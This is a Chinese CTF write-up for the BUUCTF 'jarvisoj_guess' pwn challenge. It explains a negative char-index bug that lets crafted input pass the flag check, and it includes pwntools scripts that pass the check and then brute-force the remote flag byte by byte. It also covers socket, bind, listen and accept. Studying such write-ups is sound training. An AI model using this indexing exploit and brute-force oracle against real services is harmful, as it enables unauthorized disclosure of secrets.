---
title: BUUCTF_jarvisoj_guess
tags:
 - 爆破
 - PWN
 - 数组索引无检查
categories:
 - BUU
---
# 总结：

通过这道题的学习与收获有：（说实话，我把这玩意拖到IDA里的一刻，我是想直接把它扔进回收站的，不过最终还是硬着头皮做下来了，收获也真的很多）

1、这道题的漏洞点是数组下标的不检查，导致char类型可能自身变成负数，使得我们可以输入不正常数据来通过对flag的检查。

2、使用单字节爆破的手段，获取flag，这道题对于flag的检查是判断整体的，但之所以可以进行单字节爆破是因为我们是先通过了flag的检查，然后依次改变一字节，来观察回显，我们的flag是否正确，从而进行单字节的爆破。并且还有一个前提是不限次数的输入内容（只要内容是100字节，就可以与flag进行比较判断）
<!--more-->
3、当时关于本机的flag和远程的flag这里迷了好久，我一直以为本机的是假flag，然后远程是通过某种加密手段放的是真flag（意思就是说本机flag和远程flag我感觉应该是有关系的），最后看了下前面的英文提示，又想了很久最后发现，这俩flag之间并没有任何关系...

4、我们始终都没法直接控制value_1和value_2的值，我们仅仅只能去控制bin_by_hex数组的索引，而我们爆破的其实是bin_by_hex数组的下标，而真正的flag是通过这个下标去数组bin_by_hex里面找到真正flag的所对应的字符。之所以给我们一种爆破flag的错觉其实是因为爆破的bin_by_hex数组下标正好又是对应字符的ascii（比如我爆破b的时候，分别发了6和2，这个0x62其实是bin_by_hex的下标，但是这个下标放的又正好是b）因此就感觉我们在爆破flag一样。关于这个bin_by_hex数组与它的下标这里，我迷了很久。

5、这道题最后的爆破脚本我感觉还是需要一些python功底才能写出来的（我是看了下师傅们的 exp才写出来的）

6、这道题最恶心的地方就是调试很麻烦（其实我压根就不会...），而且对于这道题调试而言的话，也不知道调试该看什么，又是要连接的，又是fork的，确实不会调...

7、熟悉了一下常见网络编程函数的功能，用IDA简单对他们进行了流程的分析。


# 保护策略：

![image-20220411121247512](/upload/img/image-20220411121247512.png)


# 程序分析：

## 关于socket网络编程的内容分析

由于一打开程序看到的就是socket网络编程的那些函数，不过这些都和这道题没有关系，**关于这些函数我将放在文章的最后分析，下面直接开始上正片。**

## 重要的英文提示

这个程序的入手点，其实是人家给出来的提示。


![image-20220411121252049](/upload/img/image-20220411121252049.png)


上面这四行话很关键，要是不注意的话，其实是很难理解这道题目。

大概意思就是说，现在你本地的这个程序是一个测试程序，在这个测试程序里面的flag，是以FAKE{开始的，其实你可以发现，**本机上的flag，ida打开之后就直接看见了**。也就是说这道题本机上的flag你是可以看见的，但是第四行说了，**具有real flag的程序是运行在服务器那边的**，它是以PCTF{开头的，并且是50个字符  （但是这道题我是从BUUCTF上做的，因此buu上服务器那边的flag依然是以flag{开头的）

一句话总结就是，**本机上的flag你能看见，服务器那边运行的这个程序同样的位置也有一个flag（和你本机上的flag不一样）你看不见，但是你要想办法知道它。** 

## 一个奇怪的负数索引

![image-20220411121255877](/upload/img/image-20220411121255877.png)


可以发现整个程序的漏洞点在这个函数里。

![image-20220411121259385](/upload/img/image-20220411121259385.png)


首先看这个地方，数组里面的下标索引值又是一个数组，这个地方应该是很容易出现问题的，再仔细分析一下，数组里面的那个数组（其实也不是数组，只是个以索引方式来检索的一个char指针），这个东西是个char类型的，char类型的怎么可以作为下标呢。

**char类型的值强转为int类型之后，超过127的话，则会变成负数**

写个脚本验证一下

![](/upload/img/image-20220411121302969.png)


因为我们可以控制flag_hex的值，而这个值我们还可以让他可正可负，因此可以利用这个点，去让value_1和value_2得到一些不正常的数据，这个点放在这里，继续往下分析。



## 分析合并v1和v2以及检查部分

![image-20220411121306086](/upload/img/image-20220411121306086.png)


这个地方，其实我自己没看明白，不过我又写了个c的程序，模拟了一下。

![image-20220411121309012](/upload/img/image-20220411121309012.png)


这回比较清晰了，value_1和value_2会合成一个十六进制的字符(en...上面的value_a就是我说的value_1，当时这里打错了），其中value_1是高位，value_2是低位。

然后就是flag[i_0]与given_flag[i_0]去异或比较，必须二者使用相同，最后的diff才是0，否则diff不是0（因为有个|，只要一次不是0，之后自己再和自己|的话，就永远都变不会0了）

而flag[i_0]里面装的就是flag（本机的话，你是可以直接看见的...，但是远程那边的flag你是看不见的，它被复制到了flag[i_0]里面）

而given_flag[i_0]则很有意思，它是前面两个value_1和value_2拼成的一个字符（拼成的是个十六进制数字然后对应其ASCII码）



## 利用负数索引

而value_1和value_2的值则是从bin_by_hex是数组里面靠索引来获取的。下面是bin_by_hex里面的内容（未截全）

![image-20220411121312767](/upload/img/image-20220411121312767.png)

这是？？？似乎感觉有点离谱，但是别忘了，我们上面提到了这个索引也可以取负数，因此看一下栈里的情况（上图原本是数据是在data段，但是这串数据被qmemcpy函数拷贝到了栈里，而依靠索引来找数据是在栈中实现的）
<img src="/upload/img/image-20220411121319605.png" alt="image-20220411121319605" style="zoom:33%;" />


发现了flag（flag也被qmemcpy函数拷贝到了栈中），居然就在bin_by_hex的上面而且距离仅仅只有0x40个字节。那我们通过负数的索引岂不是就可以很顺利的将given_flag[i_0]设置为flag。我们将value_1去设置为0（因为它乘了个16，不太好控制，把它设置为0之后，只需要控制一个value_2即可），让value_2去为flag的字符即可。**不过我们最终爆破真的flag的时候，是需要分别控制value_1和value_2**

## 关于将value_1设置为0这件事

因为我们最后发送的肯定是字符0，对应的ASCII码应该是0x30（因为char类型被作为数组下标的时候，会被自动转换成int类型），因此去bin_by_hex里面找一下0x30的索引。

![image-20220411121338305](/upload/img/image-20220411121338305.png)


发现是0（这个0可是int类型的），因此在given_flag[i] = value2 | (16 * value1);这步的时候，given_flag[i]的值就完全取决于value_2了



# 大致思路：

## 计算负数索引

我们来尝试一下这件事情，首先我们输入的内容一定要让其值为负数（因为我们需要这个负数索引），而这个负数的索引应该是要从-64开始逐渐减小（因为这个索引取得的内容距离bin_by_hex是越来越近的）

![image-20220411121342056](/upload/img/image-20220411121342056.png)


再次运行一下c写的程序，发现只要我们输入192，char被作为索引时，会自动转换成int类型，而值为-64.依次类推，我们需要50个这样的索引，因为flag是50个字符。

我们用python脚本来实现一下这件事。

```python
from pwn import *
context.log_level='debug'
p=remote('node4.buuoj.cn',29002)
payload=""
for i in range(192,192+50):
    payload+='0'+chr(i)#第一次输入字符0，让value_1的值为0
p.recvuntil('guess> ')
p.sendline(payload)
p.interactive()

```

然后...

![image-20220411121346039](/upload/img/image-20220411121346039.png)


它提示你输入对了flag，**但是事实上我们压根输入的就不是flag**，只不过是通过输入一些非正常的数据，**产生了一个负数索引，然后利用这个索引去找到了flag，从而通过了检查**，**而我们是不知道flag的**。





## 凭借伪造的flag实现单字节爆破

不过好消息是，**我们可以一直输入，只要我们输入的是一百个字节的内容**（因为程序对输入的长度是否是100字节进行了检查），程序就可以告诉我们输入的内容是正确还是错误。这个程序会将我们输入的内容作为一个整体去与flag进行判断，本来这种题目是无法单字节爆破的，**但是我们现在可以靠伪造一个flag去通过检查了，同时我们还可以继续输入内容，让程序判断输入的flag对不对，那我们只需要去每次改变一个字节，如果程序提示Yaaaay!，则说明我们爆破的这个字节是正确的，那就换下一个字节爆破，如果没有提示Yaaaay! 那就换个字符继续爆破这个字节。直到将所有的flag全部爆破出来**。

## EXP：

```python
from pwn import *
import string
#context.log_level='debug'
p=remote('node4.buuoj.cn',29002)
payload=""
for i in range(192,192+50):
    payload+='0'+chr(i)
p.recvuntil('guess> ')
#p.sendline(payload)#当用这部分内容让检查通过时，应该把这一部分注释掉，如果没有注释掉的话，会导致下面发送的内容，第一次的循环修改了内容之后，也通过了检查，因为recvline收到的是，这个payload的Yaaaay!，从而导致下面的检查判断是从第二字节开始，然后就陷入了死循环（因为第一个字节就是错的，即使第二字节爆破出来了，也不会显示Yaaaay!）
#这个解释是我通过观察debug的回显信息分析出来的，不能保证百分百对，不过目前我认为是这样。

List = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f','-','l','g','{','}']

#这里的话，自己建个列表或者用string,printable效果是一样的，这个无所谓
kkk=list(payload)
flag=""#新建一个空的flag字符串，一会爆破出来真的flag将放入这个里面
for i in range(50):
    #for x in string.printable:
    for x in List:
        kkk[2*i]=hex(ord(x))[2]#这个地方是从列表中取一个x，然后将其转换成16进制，用切片取低位
        #print("kkk[2*i])=="+kkk[2*i])
        kkk[2*i+1]=hex(ord(x))[3]#用切片取高位 舍弃前面的0x
        #print("kkk[2*i+1])=="+kkk[2*i+1])
        p.sendline("".join(kkk))#将列表kkk添加到字符串里面
        re=p.recvline()#去接收一行的信息
        if 'Yaaaay!' in re:#判断Yaaaay!是否在这一行出现
            flag+=x
            print(flag)
            break
p.interactive()

```

<img src="/upload/img/image-20220411121354338.png" alt="image-20220411121354338" style="zoom:33%;" />


# 关于前面的网络编程的内容分析

作为大一小萌新，这个学期才刚刚开了计网，嗯...不知道关于这些网络编程在计网课程的后期会不会讲，这里提前学习一下。

## socket函数

![image-20220411121402665](/upload/img/image-20220411121402665.png)


这玩意参数2,1,0就分别代表着 ipv6类型，面向连接的套接字，使用TCP传输协议    然后这个socket函数就是创建了个套接字，你要是不理解啥是套接字，你就把它当成一个文件（linux下万物皆文件），然后返回一个文件描述符（也就是新创建的这个套接字）

## bind函数

下面这个bind函数就很好理解了，就是将IP地址和端口与刚才创建的套接字进行绑定，你可能会问，这参数里面也没传IP地址和端口呀，其实IP地址和端口都在sockaddr这个结构体(在这里面这个结构体就是bind_addr)里面，而你又将这个结构体的地址当做参数传给了bind函数。因此其实bind函数是知道IP地址和端口的。

它的第一个参数就是刚才创建的套接字的文件描述符，第二个参数是bind_addr结构体的地址，第三个参数是bind_addr结构体的大小（这个是定死的）。

![image-20220411121406655](/upload/img/image-20220411121406655.png)


值得一提的就是这个结构体

![image-20220411121411369](/upload/img/image-20220411121411369.png)


最后的sin_port成员，被赋值成了0x270F，也就是端口为9999。

## listen函数

![image-20220411121415948](/upload/img/image-20220411121415948.png)

这个参数更简单了，第一个依然是创建套接字的文件描述符，第二个参数是连接请求队列的长度。

这个函数的意思就是说，让刚才创建的套接字变成被动连接，让当下的这个进程可以接收其他进程的请求，就有点服务器的那种样子嗷。

## accept函数

这个函数的意思就是创立一个新的文件描述符（你能看见它的返回值是一个新的文件描述符），这个新的文件描述符其实就是一个连接通道，接下来发送和接收的数据都将通过这个连接通道。而原本的那个文件描述符依然在监听port。

![image-20220411121420397](/upload/img/image-20220411121420397.png)


我在网上发现这个图片说的很好，搬一下 [图片出自这里]([https://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.pc_relevant_default&utm_relevant_index=1](https://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&utm_relevant_index=1))

![image-20220411121423587](/upload/img/image-20220411121423587.png)


这张是socket模型图，来源同上

![image-20220411121426925](/upload/img/image-20220411121426925.png)


然后这个地方就在说，fork了一个子进程，如果fork成功的话，就把最开始创建的那个套接字给关了，然后去处理新开的这个套接字。

<img src="/upload/img/image-20220411121432112.png" alt="image-20220411121432112" style="zoom:50%;" />
![image-20220411121438618](/upload/img/image-20220411121438618.png)

这里就是说把标准输入和标准输出重定向到这个新开的套接字上。

## 这几个函数干了啥？

整体下来的话，也并不复杂，就是在说开了一个程序自身9999的端口，等待着你连接，如果连接上来的话就开启一个新的进程，然后开始对这个新的进程操作。

在本地运行的话，也是可以看见，程序自己打开了9999端口

![image-20220411121445387](/upload/img/image-20220411121445387.png)


# 最后想强调的一点

这里已经在开始的总结里说过了，不过依然想强调一下，我们是始终都没法直接控制value_1和value_2的值，我们仅仅只能去控制bin_by_hex数组的索引，而我们爆破的其实是bin_by_hex数组的下标，而真正的flag是通过这个下标去数组bin_by_hex里面找到真正flag的所对应的字符。之所以给我们一种爆破flag的错觉其实是因为爆破的bin_by_hex数组下标正好又是对应字符的ascii（比如我爆破b的时候，分别发了6和2，这个0x62其实是bin_by_hex的下标，但是这个下标放的又正好是b）因此就感觉我们在爆破flag一样。
